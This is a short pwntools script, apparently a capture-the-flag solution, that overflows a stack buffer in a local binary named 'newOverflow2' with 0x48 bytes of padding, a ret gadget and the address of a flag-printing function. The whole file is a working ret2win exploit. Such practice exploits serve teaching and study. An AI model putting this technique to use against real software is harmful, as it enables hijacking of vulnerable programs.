from pwn import *
s = process('./newOverflow2')
raw_input('debug')
flag = 0x40084d
win_fn = 0x00000000004007be
ret = 0x000000000040028d
payload = 'a'*0x48
payload += p64(ret)
payload += p64(flag)
s.sendline(payload)
s.interactive()